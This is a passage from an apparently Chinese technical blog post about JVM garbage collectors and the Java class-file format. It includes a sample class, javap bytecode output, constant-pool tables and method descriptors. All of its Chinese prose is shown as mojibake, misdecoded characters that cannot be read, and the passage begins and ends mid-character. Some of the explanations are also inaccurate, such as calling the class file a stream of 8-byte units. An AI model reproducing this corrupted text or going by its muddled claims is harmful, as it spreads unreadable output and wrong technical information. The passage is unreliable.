†é‡Œçš„å¯¹è±¡å›¾ï¼Œæ‰¾å‡ºè¦å›æ”¶çš„å¯¹è±¡ï¼Œè¿™é˜¶æ®µè€—æ—¶è¾ƒé•¿ï¼Œä½†å¯ä¸ç”¨æˆ·ç¨‹åºå¹¶å‘æ‰§è¡Œã€‚</li><li>æœ€ç»ˆæ ‡è®°ï¼ˆæš‚åœç”¨æˆ·çº¿ç¨‹ï¼‰ï¼šå¯¹ç”¨æˆ·çº¿ç¨‹åšä¸€ä¸ªçŸ­æš‚çš„æš‚åœï¼Œç”¨äºå¤„ç†å¹¶å‘æ ‡è®°é˜¶æ®µæ¼æ ‡çš„é‚£éƒ¨åˆ†å¯¹è±¡ã€‚</li><li>ç­›é€‰å›æ”¶ï¼šè´Ÿè´£æ›´æ–°Regionçš„ç»Ÿè®¡æ•°æ®ï¼Œå¯¹å„ä¸ªRegionçš„å›æ”¶ä»·å€¼å’Œæˆæœ¬è¿›è¡Œæ’åºï¼Œæ ¹æ®ç”¨æˆ·æ‰€æœŸæœ›çš„åœé¡¿æ—¶é—´æ¥åˆ¶å®šå›æ”¶è®¡åˆ’ï¼Œå¯ä»¥è‡ªç”±é€‰æ‹©ä»»æ„å¤šä¸ªRegionæ„æˆå›æ”¶é›†ï¼Œç„¶åæŠŠå†³å®šå›æ”¶çš„é‚£ä¸€éƒ¨åˆ†Regionçš„å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°ç©ºçš„Regionä¸­ï¼Œå†æ¸…ç†æ‰æ•´ä¸ªæ—§Regionçš„å…¨éƒ¨ç©ºé—´ã€‚è¿™é‡Œçš„æ“ä½œæ¶‰åŠå­˜æ´»å¯¹è±¡çš„ç§»åŠ¨ï¼Œæ˜¯å¿…é¡»æš‚åœç”¨æˆ·çº¿ç¨‹ï¼Œç”±å¤šä¸ªæ”¶é›†å™¨çº¿ç¨‹å¹¶è¡Œå®Œæˆçš„ã€‚</li></ul><h5 id="Shenandoah-amp-ZGC-ä½å»¶è¿Ÿ"><a href="#Shenandoah-amp-ZGC-ä½å»¶è¿Ÿ" class="headerlink" title="Shenandoah &amp; ZGC (ä½å»¶è¿Ÿ)"></a>Shenandoah &amp; ZGC (ä½å»¶è¿Ÿ)</h5><p>ä¸“ä¸ºä½å»¶è¿Ÿåœºæ™¯ç‰¹åŒ–çš„åƒåœ¾æ”¶é›†å™¨ï¼Œè®ºç»¼åˆè¡¨ç°å¯èƒ½æ¯”ä¸ä¸ŠG1ï¼Œä½†ä»–ä»¬æš‚åœçº¿ç¨‹çš„æ—¶é—´æ¯”G1è¿˜è¦çŸ­å¾—å¤šã€‚é€‚åˆä¸€äº›å¯¹GCå»¶è¿Ÿæœ‰ç‰¹æ®Šè¦æ±‚çš„ç‰¹æ®Šåœºæ™¯ã€‚å…·ä½“ä¸æƒ³ä»‹ç»äº†ï¼Œæœ‰å…´è¶£å¯ä»¥è¯¾ä¸‹äº†è§£ï¼Œä»–ä»¬çš„å‡ ä¹æ•´ä¸ªå·¥ä½œè¿‡ç¨‹éƒ½æ˜¯å¹¶å‘çš„ï¼Œå·¥ä½œåŸç†è›®æœ‰æ„æ€çš„ã€‚</p><h2 id="å­—èŠ‚ç "><a href="#å­—èŠ‚ç " class="headerlink" title="å­—èŠ‚ç "></a>å­—èŠ‚ç </h2><p>ç»ˆäºå†™åˆ°è¿™é‡Œäº†ï¼Œæˆ‘æœ€æƒ³è®²çš„å°±æ˜¯è¿™ä¸ªï¼Œè¿™ä¸ªä¹Ÿæœ€å¥½ç©:D</p><h3 id="ä»€ä¹ˆæ˜¯å­—èŠ‚ç "><a href="#ä»€ä¹ˆæ˜¯å­—èŠ‚ç " class="headerlink" title="ä»€ä¹ˆæ˜¯å­—èŠ‚ç "></a>ä»€ä¹ˆæ˜¯å­—èŠ‚ç </h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒJavaæ˜¯ä¸€é—¨è·¨å¹³å°è¯­è¨€ï¼Œåªè¦èƒ½è·‘JVMçš„å¹³å°éƒ½èƒ½è¿è¡ŒåŒä¸€ä»½JaråŒ…ã€‚è€ŒJaråŒ…å…¶å®æœ¬è´¨ä¸Šå°±æ˜¯ä¸€å †classæ–‡ä»¶å’Œä¸€äº›èµ„æºæ–‡ä»¶æ‰“åŒ…æ”¾åˆ°ä¸€ä¸ªå‹ç¼©åŒ…é‡Œç½¢äº†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥è¿è¡Œclassæ–‡ä»¶ã€‚é‚£ä¹ˆclassæ–‡ä»¶é‡Œé¢æœ‰ä»€ä¹ˆå†…å®¹å‘¢ï¼Ÿè‚¯å®šä¸å¯èƒ½æ˜¯æœºå™¨ç å§ï¼Œå¦‚æœæ˜¯æœºå™¨ç è¦æ€ä¹ˆè·¨å¹³å°ï¼Ÿç­”æ¡ˆå°±æ˜¯å­—èŠ‚ç ã€‚Kotlinä¹‹æ‰€ä»¥å…¼å®¹Javaï¼Œä¹Ÿæ˜¯å› ä¸ºå®ƒæ˜¯æŠŠktæ–‡ä»¶ç¼–è¯‘æˆå­—èŠ‚ç ï¼Œè€ŒJavaå’ŒKotlinä¹‹é—´çš„ç›¸äº’è°ƒç”¨å…¶å®å°±æ˜¯å­—èŠ‚ç ä¹‹é—´çš„è°ƒç”¨ã€‚JVMå†…ç½®å­—èŠ‚ç è§£é‡Šå™¨ï¼Œåœ¨è¿è¡Œæ—¶åŠ¨æ€è§£é‡Šå­—èŠ‚ç æ–‡ä»¶ï¼ŒæŠŠå­—èŠ‚ç ç¿»è¯‘æˆå¯¹åº”å¹³å°çš„æœºå™¨ç è¿è¡Œã€‚</p><h3 id="ç±»æ–‡ä»¶çš„åŸºç¡€ç»“æ„"><a href="#ç±»æ–‡ä»¶çš„åŸºç¡€ç»“æ„" class="headerlink" title="ç±»æ–‡ä»¶çš„åŸºç¡€ç»“æ„"></a>ç±»æ–‡ä»¶çš„åŸºç¡€ç»“æ„</h3><p>Classæ–‡ä»¶æ˜¯ä¸€ç»„ä»¥8ä¸ªå­—èŠ‚ä¸ºåŸºç¡€å•ä½çš„äºŒè¿›åˆ¶æµï¼Œå½“é‡åˆ°éœ€è¦å ç”¨8ä¸ªå­—èŠ‚ä»¥ä¸Šç©ºé—´çš„æ•°æ®é¡¹æ—¶ï¼Œåˆ™ä¼šæŒ‰ç…§é«˜ä½åœ¨å‰çš„æ–¹å¼åˆ†å‰²æˆè‹¥å¹²ä¸ª8ä¸ªå­—èŠ‚è¿›è¡Œå­˜å‚¨ã€‚Classæ–‡ä»¶ä½¿ç”¨ä¸€ç§ç±»ä¼¼äºCè¯­è¨€ç»“æ„ä½“çš„ä¼ªç»“æ„æ¥å­˜å‚¨æ•°æ®ï¼Œè¿™ç§ä¼ªç»“æ„ä¸­åªæœ‰ä¸¤ç§æ•°æ®ç±»å‹: <strong>æ— ç¬¦å·æ•°</strong>, <strong>è¡¨</strong>ã€‚åé¢çš„è§£æéƒ½ä»¥è¿™ä¸¤ç§æ•°æ®ç±»å‹ä¸ºåŸºç¡€ã€‚</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€æ®µç¤ºä¾‹ä»£ç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClazz</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">+</span> a<span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"execute sum function."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬ç”¨<code>javap -verbose</code> æŒ‡ä»¤å°†å®ƒç¼–è¯‘å¹¶è§£ç ä¸ºæˆ‘ä»¬è‚‰çœ¼å¯ä»¥è§‚æµ‹çš„å­—èŠ‚ç </p><pre class="line-numbers language-none"><code class="language-none">Classfile /D:/project/android/ksp-learn/test/build/classes/java/main/kim/bifrost/rain/ksp/TestClazz.class  Last modified 2022-7-9; size 754 bytes  MD5 checksum 2b38afaa297c7960c988943b0c475282  Compiled from "TestClazz.java"public class kim.bifrost.rain.ksp.TestClazz  minor version: 0  major version: 52  flags: ACC_PUBLIC, ACC_SUPERConstant pool:   #1 = Methodref          #8.#27         // java/lang/Object."&lt;init&gt;":()V   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V   #5 = String             #33            // execute sum function.   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz   #8 = Class              #36            // java/lang/Object   #9 = Utf8               &lt;init&gt;  #10 = Utf8               ()V  #11 = Utf8               Code  #12 = Utf8               LineNumberTable  #13 = Utf8               LocalVariableTable  #14 = Utf8               this  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;  #16 = Utf8               main  #17 = Utf8               ([Ljava/lang/String;)V  #18 = Utf8               args  #19 = Utf8               [Ljava/lang/String;  #20 = Utf8               a  #21 = Utf8               I  #22 = Utf8               b  #23 = Utf8               sum  #24 = Utf8               (II)I  #25 = Utf8               SourceFile  #26 = Utf8               TestClazz.java  #27 = NameAndType        #9:#10         // "&lt;init&gt;":()V  #28 = Class              #37            // java/lang/System  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;  #30 = NameAndType        #23:#24        // sum:(II)I  #31 = Class              #40            // java/io/PrintStream  #32 = NameAndType        #41:#42        // println:(I)V  #33 = Utf8               execute sum function.  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz  #36 = Utf8               java/lang/Object  #37 = Utf8               java/lang/System  #38 = Utf8               out  #39 = Utf8               Ljava/io/PrintStream;  #40 = Utf8               java/io/PrintStream  #41 = Utf8               println  #42 = Utf8               (I)V  #43 = Utf8               (Ljava/lang/String;)V{  public kim.bifrost.rain.ksp.TestClazz();    descriptor: ()V    flags: ACC_PUBLIC    Code:      stack=1, locals=1, args_size=1         0: aload_0         1: invokespecial #1                  // Method java/lang/Object."&lt;init&gt;":()V         4: return      LineNumberTable:        line 10: 0      LocalVariableTable:        Start  Length  Slot  Name   Signature            0       5     0  this   Lkim/bifrost/rain/ksp/TestClazz;  public static void main(java.lang.String[]);    descriptor: ([Ljava/lang/String;)V    flags: ACC_PUBLIC, ACC_STATIC    Code:      stack=3, locals=3, args_size=1         0: iconst_1         1: istore_1         2: iconst_2         3: iload_1         4: iadd         5: istore_2         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;         9: iload_1        10: iload_2        11: invokestatic  #3                  // Method sum:(II)I        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V        17: return      LineNumberTable:        line 12: 0        line 13: 2        line 14: 6        line 15: 17      LocalVariableTable:        Start  Length  Slot  Name   Signature            0      18     0  args   [Ljava/lang/String;            2      16     1     a   I            6      12     2     b   I}SourceFile: "TestClazz.java"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="é­”æ•°-amp-Classæ–‡ä»¶ç‰ˆæœ¬"><a href="#é­”æ•°-amp-Classæ–‡ä»¶ç‰ˆæœ¬" class="headerlink" title="é­”æ•° &amp; Classæ–‡ä»¶ç‰ˆæœ¬"></a>é­”æ•° &amp; Classæ–‡ä»¶ç‰ˆæœ¬</h4><p>classæ–‡ä»¶çš„å‰4ä¸ªByteè¢«ç§°ä¸ºé­”æ•°(Magic Number), è¿™äº›é­”æ•°çš„æ„ä¹‰åœ¨äºæ ‡è¯†classæ–‡ä»¶ã€‚åœ¨ç±»çš„åŠ è½½é˜¶æ®µä¼šæ ¹æ®è¿™å¤´å››ä¸ªByteåˆ¤æ–­æ˜¯å¦æ˜¯åˆæ³•çš„classæ–‡ä»¶ã€‚é­”æ•°çš„é€‰å–ä¹Ÿé¢‡æœ‰å†å²æ¸Šæº<code>0xCAFE BABE</code>ï¼ŒJavaçš„åˆ›å§‹äººååˆ†å–œæ¬¢å’–å•¡:)ã€‚</p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/aZx0S4EjfY.jpg" alt="aZx0S4EjfY"></p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220709-173350.jpg" alt="é£ä¹¦20220709-173350"></p><p>éšåç¬¬å››ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯7åˆ—å­˜å‚¨ç€å­—èŠ‚ç çš„ç‰ˆæœ¬å·ã€‚è¿™é‡Œæ˜¯34ï¼Œä»16è¿›åˆ¶ç¿»è¯‘è¿‡æ¥å°±æ˜¯52ï¼Œå¯¹åº”ç€Java8çš„å­—èŠ‚ç ç‰ˆæœ¬ã€‚</p><p>ç¬¬5å’Œç¬¬6ä¸ªå­—èŠ‚æ˜¯æ¬¡ç‰ˆæœ¬å·ï¼ˆMinor Versionï¼‰,ç¬¬7ï¼Œ8ä¸ªå­—èŠ‚æ˜¯ä¸»ç‰ˆæœ¬å·ï¼ˆMajor Versionï¼‰ã€‚Javaæ˜¯ç‰ˆæœ¬å·æ˜¯ä»45å¼€å§‹ï¼ŒJDK1.1ä¹‹åçš„æ¯ä¸ªJDKå¤§ç‰ˆæœ¬å‘å¸ƒä¸»ç‰ˆæœ¬å·å‘ä¸Š+1ï¼Œé«˜ç‰ˆæœ¬çš„JDKèƒ½å‘ä¸‹å…¼å®¹ä»¥å‰ç‰ˆæœ¬çš„Classæ–‡ä»¶ï¼Œè€Œä¸èƒ½è¿è¡Œä»¥åç‰ˆæœ¬çš„Classæ–‡ä»¶ã€‚</p><h4 id="å¸¸é‡æ± "><a href="#å¸¸é‡æ± " class="headerlink" title="å¸¸é‡æ± "></a>å¸¸é‡æ± </h4><p>å³</p><pre class="line-numbers language-none"><code class="language-none">Constant pool:   #1 = Methodref          #8.#27         // java/lang/Object."&lt;init&gt;":()V   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V   #5 = String             #33            // execute sum function.   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz   #8 = Class              #36            // java/lang/Object   #9 = Utf8               &lt;init&gt;  #10 = Utf8               ()V  #11 = Utf8               Code  #12 = Utf8               LineNumberTable  #13 = Utf8               LocalVariableTable  #14 = Utf8               this  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;  #16 = Utf8               main  #17 = Utf8               ([Ljava/lang/String;)V  #18 = Utf8               args  #19 = Utf8               [Ljava/lang/String;  #20 = Utf8               a  #21 = Utf8               I  #22 = Utf8               b  #23 = Utf8               sum  #24 = Utf8               (II)I  #25 = Utf8               SourceFile  #26 = Utf8               TestClazz.java  #27 = NameAndType        #9:#10         // "&lt;init&gt;":()V  #28 = Class              #37            // java/lang/System  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;  #30 = NameAndType        #23:#24        // sum:(II)I  #31 = Class              #40            // java/io/PrintStream  #32 = NameAndType        #41:#42        // println:(I)V  #33 = Utf8               execute sum function.  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz  #36 = Utf8               java/lang/Object  #37 = Utf8               java/lang/System  #38 = Utf8               out  #39 = Utf8               Ljava/io/PrintStream;  #40 = Utf8               java/io/PrintStream  #41 = Utf8               println  #42 = Utf8               (I)V  #43 = Utf8               (Ljava/lang/String;)V<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç´§æ¥ç€ä¸»æ¬¡ç‰ˆæœ¬å·ä¹‹åçš„æ˜¯å¸¸é‡æ± å…¥å£ï¼Œå¸¸é‡æ± å¯ä»¥æ¯”å–»ä¸ºClassæ–‡ä»¶é‡Œçš„èµ„æºä»“åº“ï¼Œå®ƒæ˜¯Classæ–‡ä»¶ç»“æ„ä¸­ä¸å…¶ä»–é¡¹ç›®å…³è”æœ€å¤šçš„æ•°æ®ã€‚</p><p>é¦–å…ˆä¸Šæ¥å°±ä¼šæœ‰ä¸€ä¸ª1å­—èŠ‚çš„æ— ç¬¦å·æ•°ï¼Œå®ƒç”¨äºè¡¨ç¤ºå½“å‰å¸¸é‡çš„ç±»å‹ï¼ˆå¸¸é‡ç±»å‹æœ‰å¾ˆå¤šä¸ªï¼‰è¿™é‡Œåªåˆ—ä¸¾ä¸€éƒ¨åˆ†çš„ç±»å‹ä»‹ç»ï¼š</p><table><thead><tr><th align="center">ç±»å‹</th><th align="center">æ ‡å¿—</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">CONSTANT_Utf8_info</td><td align="center">1</td><td align="center">UTF-8ç¼–ç æ ¼å¼çš„å­—ç¬¦ä¸²</td></tr><tr><td align="center">CONSTANT_Integer_info</td><td align="center">3</td><td align="center">æ•´å½¢å­—é¢é‡ï¼ˆç¬¬ä¸€ç« æˆ‘ä»¬æ¼”ç¤ºçš„å¾ˆå¤§çš„æ•°å­—ï¼Œå®é™…ä¸Šå°±æ˜¯ä»¥å­—é¢é‡å­˜å‚¨åœ¨å¸¸é‡æ± ä¸­çš„ï¼‰</td></tr><tr><td align="center">CONSTANT_Class_info</td><td align="center">7</td><td align="center">ç±»æˆ–æ¥å£çš„ç¬¦å·å¼•ç”¨</td></tr><tr><td align="center">CONSTANT_String_info</td><td align="center">8</td><td align="center">å­—ç¬¦ä¸²ç±»å‹çš„å­—é¢é‡</td></tr><tr><td align="center">CONSTANT_Fieldref_info</td><td align="center">9</td><td align="center">å­—æ®µçš„ç¬¦å·å¼•ç”¨</td></tr><tr><td align="center">CONSTANT_Methodref_info</td><td align="center">10</td><td align="center">æ–¹æ³•çš„ç¬¦å·å¼•ç”¨</td></tr><tr><td align="center">CONSTANT_MethodType_info</td><td align="center">16</td><td align="center">æ–¹æ³•ç±»å‹</td></tr><tr><td align="center">CONSTANT_NameAndType_info</td><td align="center">12</td><td align="center">å­—æ®µæˆ–æ–¹æ³•çš„éƒ¨åˆ†ç¬¦å·å¼•ç”¨</td></tr></tbody></table><p>å®é™…ä¸Šè¿™äº›ä¸œè¥¿ï¼Œè™½ç„¶æˆ‘ä»¬ä¸çŸ¥é“ç¬¦å·å¼•ç”¨æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿå‡ºæ¥ï¼Œè¿™äº›ä¸œè¥¿æˆ–å¤šæˆ–å°‘éƒ½æ˜¯å­˜æ”¾ç±»ä¸­ä¸€äº›åç§°ã€æ•°æ®ä¹‹ç±»çš„ä¸œè¥¿ã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬æ¥çœ‹ç¬¬ä¸€ä¸ª<code>CONSTANT_Methodref_info</code>è¡¨ä¸­å­˜æ”¾äº†ä»€ä¹ˆæ•°æ®ï¼Œè¿™é‡Œæˆ‘åªåˆ—å‡ºå®ƒçš„ç»“æ„è¡¨ï¼ˆè¯¦ç»†çš„ç»“æ„è¡¨å¯ä»¥æŸ¥é˜…ã€Šæ·±å…¥ç†è§£Javaè™šæ‹Ÿæœº ç¬¬ä¸‰ç‰ˆã€‹ä¸­222é¡µæ€»è¡¨ï¼‰ï¼š</p><table><thead><tr><th align="center">å¸¸é‡</th><th align="center">é¡¹ç›®</th><th align="center">ç±»å‹</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">CONSTANT_Methodref_info</td><td align="center">tag</td><td align="center">u1</td><td align="center">å€¼ä¸º10</td></tr><tr><td align="center"></td><td align="center">index</td><td align="center">u2</td><td align="center">æŒ‡å‘å£°æ˜æ–¹æ³•çš„ç±»æè¿°çˆ¶CONSTANT_Class_infoç´¢å¼•é¡¹</td></tr><tr><td align="center"></td><td align="center">index</td><td align="center">u2</td><td align="center">æŒ‡å‘åç§°åŠç±»å‹æè¿°ç¬¦CONSTANT_NameAndType_infoç´¢å¼•é¡¹</td></tr></tbody></table><p>å†çœ‹çœ‹å®ƒæŒ‡å‘çš„<code>CONSTANT_Class_info</code>å’Œ<code>CONSTANT_NameAndType_info</code>çš„ç»“æ„</p><table><thead><tr><th align="center">å¸¸é‡</th><th align="center">é¡¹ç›®</th><th align="center">ç±»å‹</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">CONSTANT_Class_info</td><td align="center">tag</td><td align="center">u1</td><td align="center">å€¼ä¸º7</td></tr><tr><td align="center"></td><td align="center">index</td><td align="center">u2</td><td align="center">æŒ‡å‘å…¨é™å®šåå¸¸é‡é¡¹çš„ç´¢å¼•</td></tr></tbody></table><table><thead><tr><th align="center">å¸¸é‡</th><th align="center">é¡¹ç›®</th><th align="center">ç±»å‹</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">CONSTANT_NameAndType_info</td><td align="center">tag</td><td align="center">u1</td><td align="center">å€¼ä¸º12</td></tr><tr><td align="center"></td><td align="center">index</td><td align="center">u2</td><td align="center">æŒ‡å‘å­—æ®µæˆ–æ–¹æ³•åç§°å¸¸é‡é¡¹çš„ç´¢å¼•</td></tr><tr><td align="center"></td><td align="center">index</td><td align="center">u2</td><td align="center">æŒ‡å‘å­—æ®µæˆ–æ–¹æ³•æè¿°ç¬¦å¸¸é‡é¡¹çš„ç´¢å¼•</td></tr></tbody></table><h5 id="æ–¹æ³•æ ‡è¯†ç¬¦"><a href="#æ–¹æ³•æ ‡è¯†ç¬¦" class="headerlink" title="æ–¹æ³•æ ‡è¯†ç¬¦"></a>æ–¹æ³•æ ‡è¯†ç¬¦</h5><p>å†è¯´ä¸€ä¸‹æ–¹æ³•æ ‡è¯†ç¬¦ï¼Œæˆ‘ä»¬å…ˆæ‰¾åˆ°sumæ–¹æ³•çš„NameAndTypeå¸¸é‡</p><blockquote><p>#30 = NameAndType        #23:#24        // sum:(II)I</p></blockquote><p>æˆ‘ä»¬ä¼šå‘ç°è¿™é‡Œå·²ç»ä¸ºæˆ‘ä»¬æ ‡è¯†å‡ºæ¥äº†ï¼Œ#23å¯¹åº”<code>sum</code>ï¼Œä¹Ÿå°±æ˜¯æ–¹æ³•åç§°ã€‚#24å¯¹åº”<code>(II)I</code>å³æ–¹æ³•æ ‡è¯†ç¬¦ã€‚</p><p>é‚£ä¹ˆè¿™ä¸ª(II)Iæœ‰ä»€ä¹ˆæ„æ€å‘¢ï¼Œæ‹¬å·å†…çš„ä¸¤ä¸ªIä»£è¡¨è¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªintç±»å‹çš„å½¢å‚ï¼Œæ‹¬å·åé¢çš„Iä»£è¡¨è¯¥æ–¹æ³•çš„è¿”å›å€¼æ˜¯intç±»å‹ã€‚</p><p>è‡³äºä¸åŒç±»å‹çš„ä¿®é¥°ç¬¦ï¼Œæˆ‘è´´ä¸€ä¸ªè¡¨åœ¨ä¸‹é¢:</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzno2stssaj216i08mjsr.jpg" alt="image-20220223192518999"></p><p>æ„é€ å™¨çš„æ ‡è¯†ç¬¦ä¸º<code>()V</code>ï¼Œå³ä¸€ä¸ªæ— å½¢å‚ï¼Œè¿”å›å€¼ä¸ºvoidç±»å‹çš„æ–¹æ³•ã€‚</p><p>å†ä¸¾å‡ ä¸ªä¾‹å­:</p><blockquote><p>public Set<arathothattribute> getAttrInstSet()</arathothattribute></p><p>()Ljava/util/Set&lt;ink/rainbowbridge/v1/arathoth/attribute/abstracts/ArathothAttribute;&gt;;</p><p>å¦‚ä½ æ‰€è§ï¼Œæ³›å‹å¹¶ä¸ä¼šåœ¨ç¼–è¯‘æ—¶è¢«æ“¦é™¤ï¼Œåªä¼šåœ¨è¿è¡Œæ—¶</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿è¡Œæ—¶é€šè¿‡è‰å­—èŠ‚ç çš„æ–¹å¼è·å¾—ä¸€ä¸ªå·²ç»è¢«æ“¦é™¤çš„æ³›å‹</p></blockquote><blockquote><p>public Double getRandom(Double value1, Double value2)</p><p>(Ljava/lang/Double;Ljava/lang/Double;)Ljava/lang/Double;</p><p>è£…ç®±åçš„åŸºç¡€ç±»å‹å®é™…ä¸Šæ˜¯ç±»</p><p>æç‚¹é¢˜å¤–è¯</p><p>public double sum(Double value1, double value2) {</p><p>â€‹        return value1 + value2;</p><p>}</p><p>ä½ ä»¬è§‰å¾—å®ƒç¼–è¯‘å‡ºæ¥å­—èŠ‚ç ä¼šæ€ä¹ˆæ ·:), å®é™…ä¸Šå­—èŠ‚ç è°ƒç”¨äº†value1çš„doubleValue()æ–¹æ³•å¾—åˆ°äº†æœªè£…ç®±çš„å€¼ï¼Œå†è¿›è¡Œç›¸åŠ ã€‚</p><p>åä¹‹äº¦ç„¶ï¼Œjavaæœ‰è‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®±çš„ç‰¹æ€§ã€‚</p></blockquote><blockquote><p>é‚£ä¹ˆæ•°ç»„ä¼šå¦‚ä½•å‘¢</p><p>public double[] getRandomNums()</p><p>()[D</p><p>å½“ç„¶æ˜¯åœ¨å‰é¢åŠ ä¸ª[</p></blockquote><h4 id="è®¿é—®æ ‡å¿—"><a href="#è®¿é—®æ ‡å¿—" class="headerlink" title="è®¿é—®æ ‡å¿—"></a>è®¿é—®æ ‡å¿—</h4><p>å³</p><pre class="line-numbers language-none"><code class="language-none">flags: ACC_PUBLIC, ACC_SUPER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»å­—é¢ä¸Šåº”è¯¥å°±èƒ½çŒœå‡ºè¿™äº›è®¿é—®æ ‡å¿—çš„æ„æ€ï¼Œå®ƒä»¬ç”¨æ¥æè¿°ä¸€ä¸ªç±»/æ–¹æ³•/å­—æ®µçš„å„ç§ä¿®é¥°ç¬¦ã€‚</p><p>ç±»çš„æ ‡å¿—ç±»å‹:</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gznp9glonej216i0hcjui.jpg" alt="image-20220223200619811"></p><p>å­—æ®µçš„æ ‡å¿—ç±»å‹:</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gznpe7is4wj21620eswh4.jpg" alt="image-20220223201053780"></p><p>æ–¹æ³•çš„æ ‡å¿—ç±»å‹:</p><table><thead><tr><th>æ ‡å¿—åç§°</th><th>æ 